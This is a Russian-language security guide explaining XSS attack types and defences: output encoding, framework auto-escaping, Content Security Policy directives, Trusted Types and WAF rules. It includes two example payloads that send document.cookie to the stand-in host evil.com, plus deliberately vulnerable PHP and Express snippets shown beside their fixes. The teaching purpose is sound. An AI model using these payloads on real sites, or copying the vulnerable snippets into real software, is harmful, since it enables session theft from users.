# XSS (Cross-Site Scripting) и CSP (Content Security Policy)

## Definitions

**XSS (Cross-Site Scripting)** — атака на веб-приложения, при которой злоумышленник внедряет вредоносный JavaScript-код на страницы, просматриваемые другими пользователями. Цель — кража данных, выполнение действий от имени пользователя или изменение содержимого страницы.

**CSP (Content Security Policy)** — механизм безопасности через HTTP-заголовок `Content-Security-Policy`. Контролирует, какие ресурсы (скрипты, стили, изображения, фреймы) браузер может загружать и выполнять, являясь эффективным рубежом защиты от XSS.

### Классификация типов XSS

| Тип | Механизм | Характеристика |
| :--- | :--- | :--- |
| **Stored (Хранимый)** | Скрипт сохраняется на сервере (комментарии, профиль, сообщения) | Самый опасный — затрагивает всех пользователей страницы |
| **Reflected (Отражённый)** | Скрипт передаётся через HTTP-запрос (URL-параметр, форма) и отражается в ответе | Требует социальной инженерии — жертва должна перейти по ссылке |
| **DOM-based** | Атака полностью на стороне клиента через небезопасную обработку данных JavaScript (`innerHTML`, `eval`, `location.hash`) | Сервер не участвует — сложно обнаружить SAST, нужен DAST |
| **Mutation-based** | Браузер мутирует DOM после загрузки, и вредоносный код появляется в результате парсинга | Редкий тип, эксплуатирует особенности HTML-парсеров браузеров |

### Последствия XSS-атак

- Кража сессионных cookies и токенов (флаг `HttpOnly` — частичная защита)
- Подмена содержимого страницы (defacing)
- Перенаправление на фишинговые сайты
- Выполнение действий от имени пользователя (CSRF через XSS)
- Перехват нажатий клавиш (keylogging)
- Распространение вредоноса через скомпрометированную страницу

## Basic Concepts

### Механизм отражённой XSS-атаки

```
Злоумышленник → отправляет жертве ссылку:
  https://example.com/search?q=<script>fetch('https://evil.com/?c='+document.cookie)</script>

Жертва → переходит по ссылке
Сервер → отражает параметр в HTML: <p>Результаты поиска: <script>...</script></p>
Браузер жертвы → исполняет скрипт → cookies уходят на evil.com
```

### Хранимая XSS — цепочка

```
1. Злоумышленник сохраняет комментарий: <img src=x onerror="document.location='https://evil.com/?c='+document.cookie">
2. Комментарий сохраняется в БД
3. Любой пользователь открывает страницу — браузер исполняет скрипт
```

### DOM-based XSS — примеры sink'ов

Sink — функция, которая исполняет переданные данные как код:

| Sink | Почему опасен |
| :--- | :--- |
| `element.innerHTML = userInput` | Парсит HTML и исполняет скрипты |
| `element.outerHTML = userInput` | Аналогично innerHTML |
| `eval(userInput)` | Прямое исполнение JS |
| `document.write(userInput)` | Вставка и исполнение в DOM |
| `setTimeout(userInput, 0)` | Исполнение строки как кода |
| `location.href = userInput` | Редирект на контролируемую страницу |

Безопасные альтернативы: `textContent`, `setAttribute` с валидацией, `createElement`.

### Фундаментальные принципы защиты от XSS

1. **Экранирование вывода (Output Encoding)** — основной метод. Данные преобразуются перед вставкой в HTML: `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#x27;`, `&` → `&amp;`
2. **Валидация ввода (Allowlist)** — сервер проверяет формат, тип и длину данных
3. **Современные фреймворки** — React, Vue, Angular автоматически экранируют вывод
4. **Content-Security-Policy** — последний рубеж, блокирует исполнение неразрешённых скриптов
5. **HttpOnly + Secure флаги cookie** — защита от кражи сессии через XSS

### Концепции Content Security Policy

CSP определяет белый список доверенных источников контента.

#### Основные директивы

| Директива | Что контролирует |
| :--- | :--- |
| `default-src` | Источник по умолчанию для всех типов контента |
| `script-src` | Источники JavaScript |
| `style-src` | Источники CSS |
| `img-src` | Источники изображений |
| `connect-src` | Источники для fetch/XMLHttpRequest/WebSocket |
| `font-src` | Источники шрифтов |
| `frame-src` / `frame-ancestors` | Источники фреймов / кто может встраивать страницу |
| `object-src` | Источники плагинов (Flash, Java) |
| `base-uri` | Ограничивает URL в `<base>` |
| `form-action` | Ограничивает URL для отправки форм |

#### Специальные значения

| Значение | Описание |
| :--- | :--- |
| `'self'` | Только текущий origin (домен + протокол + порт) |
| `'none'` | Запретить всё |
| `'unsafe-inline'` | Разрешить inline-скрипты/стили (ослабляет защиту) |
| `'unsafe-eval'` | Разрешить `eval()` и аналоги |
| `'nonce-<base64>'` | Разрешить скрипт с конкретным nonce |
| `'sha256-<hash>'` | Разрешить скрипт с конкретным хешем |
| `https:` | Разрешить ресурсы только по HTTPS |

#### Режим Report-Only

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

Политика не блокирует ресурсы, а отправляет отчёты о нарушениях на указанный `report-uri` (или через `report-to` для CSP Level 3). Позволяет безопасно тестировать CSP перед полным внедрением.

#### Nonce и Hashes

Механизмы для разрешения конкретных inline-скриптов без `'unsafe-inline'`:

```http
Content-Security-Policy: script-src 'nonce-abc123' 'self'
```

```html
<script nonce="abc123">console.log('разрешённый скрипт');</script>
```

Nonce генерируется заново на каждый запрос, хеш вычисляется по содержимому скрипта.

### Trusted Types (дополнительная защита)

[Trusted Types](https://web.dev/trusted-types/) — браузерный API, запрещающий передачу строк в DOM-sink'и без явного создания «доверенного значения» через sanitizer:

```javascript
// Без Trusted Types — уязвимо
element.innerHTML = userInput;

// С Trusted Types — браузер заблокирует строку
// Требуется создать TrustedHTML через sanitizer
```

Включается через CSP: `Content-Security-Policy: require-trusted-types-for 'script';`

## Practical Scenarios

### Пример уязвимого кода и защиты

**PHP — отражённая XSS:**

```php
// УЯЗВИМО
echo "Поисковый запрос: " . $_GET['q'];

// БЕЗОПАСНО — экранирование
echo "Поисковый запрос: " . htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
```

**Node.js (Express) — stored XSS:**

```javascript
// УЯЗВИМО — прямой вывод в шаблоне
app.get('/comment', (req, res) => {
    res.send(`<p>${comment.text}</p>`);
});

// БЕЗОПАСНО — шаблонизатор с авто-экранированием (Pug, EJS)
// Pug по умолчанию экранирует #{variable}
res.render('comment', { text: comment.text });
```

**Python (Flask + Jinja2):**

```python
# Jinja2 по умолчанию экранирует {{ variable }}
# ОПАСНО — фильтр |safe отключает экранирование
{{ user_input|safe }}  # Только если входные данные доверенные!
```

### Защита через CSP — строгая политика

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self' data:;
  connect-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
```

Эта политика разрешает ресурсы только с текущего домена, запрещает плагины и встраивание, автоматически обновляет HTTP → HTTPS.

### Внедрение CSP через веб-серверы

Подробные инструкции — в специализированных руководствах:

- **Nginx:** [Руководство по безопасности Nginx](../../WebServers/Nginx/Security/nginx_security_guide.md)
- **Apache:** [Руководство по усилению безопасности Apache](../../WebServers/Apache/apache_hardening.md)

### Автоматическое экранирование во фреймворках

| Фреймворк | Механизм | Примечание |
| :--- | :--- | :--- |
| **React** | JSX экранирует `{variable}` по умолчанию | Опасен `dangerouslySetInnerHTML` |
| **Vue.js** | Интерполяция `{{ variable }}` экранируется | `v-html` отключает защиту |
| **Angular** | Авто-экранирование, sanitization DOM | `DomSanitizer.bypassSecurityTrustHtml` — с осторожностью |
| **Django Templates** | Авто-экранирование `{{ variable }}` | Фильтр `|safe` отключает |
| **Jinja2 (Flask)** | Авто-экранирование `{{ variable }}` | Фильтр `|safe` отключает |

**Критично:** даже во фреймворках с авто-экранированием разработчик может вручную отключить защиту — необходимы code review и SAST.

### Инструменты обнаружения XSS

| Инструмент | Тип | Назначение |
| :--- | :--- | :--- |
| [XSStrike](https://github.com/s0md3v/XSStrike) | Exploitation | Автоматическое обнаружение и эксплуатация XSS |
| [dalfox](https://github.com/hahwul/dalfox) | Exploitation | Быстрый XSS-сканер с поддержкой blind XSS |
| SAST (SonarQube, Semgrep, Checkmarx) | Static analysis | Поиск неэкранированного вывода — [обзор SAST](../../CI-CD/DevSecOps/sast_overview.md) |
| DAST (OWASP ZAP, Burp Suite) | Dynamic analysis | Тестирование работающего приложения — [обзор DAST](../../CI-CD/DevSecOps/dast_overview.md) |
| WAF (ModSecurity, CloudFlare) | Runtime protection | Блокировка известных XSS-паттернов — [WAF](./waf.md) |

## Additional Information

### Связанные уязвимости

- **CSRF (Cross-Site Request Forgery):** Выполнение несанкционированных запросов от имени пользователя — XSS усиливает CSRF, обходя CSRF-защиту
- **Command Injection:** Внедрение системных команд — [SAST/DAST уязвимости](../../CI-CD/DevSecOps/sast_dast_vulnerabilities.md)
- **SQL Injection:** Внедрение SQL-запросов — [SQL Injection](./sql_injection.md)

### OWASP и стандарты

- **OWASP Top 10:** A03:2021 — Injection ([OWASP Top 10 2021](https://owasp.org/Top10/A03_2021-Injection/))
- **OWASP XSS Prevention Cheat Sheet:** [XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- **OWASP CSP Cheat Sheet:** [Content Security Policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- **CWE-79:** [Cross-site Scripting (CWE)](https://cwe.mitre.org/data/definitions/79.html)

### WAF как виртуальный патч

WAF не устраняет уязвимость, но обеспечивает временную защиту ([Virtual Patching](./waf.md)):

```
# Пример правила ModSecurity (OWASP CRS)
SecRule ARGS "@detectXSS" \
    "id:941100,\
    phase:2,\
    deny,\
    status:403,\
    msg:'XSS Attack Detected'"
```

**Важно:** WAF — дополнительный слой. Обход возможен через кодирование (URL-encoding, HTML entities, Unicode), обфускацию, DOM-based XSS (не виден серверному WAF).

### CSP Evaluator и инструменты

- **Google CSP Evaluator:** [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/) — анализ политики на ошибки и обходы
- **Report URI:** [report-uri.com](https://report-uri.com/) — сбор и анализ CSP-нарушений
- **Mozilla Observatory:** [observatory.mozilla.org](https://observatory.mozilla.org/) — комплексная оценка безопасности сайта, включая CSP

### Многоуровневая защита

Эффективная защита от XSS требует комбинации мер:

1. **Output Encoding** — основной рубеж (экранирование при выводе)
2. **Input Validation (allowlist)** — фильтрация по формату и типу на входе
3. **Безопасные фреймворки** — React, Vue, Angular с авто-экранированием
4. **CSP** — блокировка исполнения неразрешённых скриптов
5. **HttpOnly + Secure cookie** — защита сессии от кражи
6. **WAF** — защита от известных паттернов и zero-day
7. **SAST/DAST в CI/CD** — автоматическое обнаружение до production — [DevSecOps процесс](../../CI-CD/DevSecOps/devsecops_overview.md)
8. **Trusted Types** — дополнительная защита от DOM-based XSS на уровне браузера
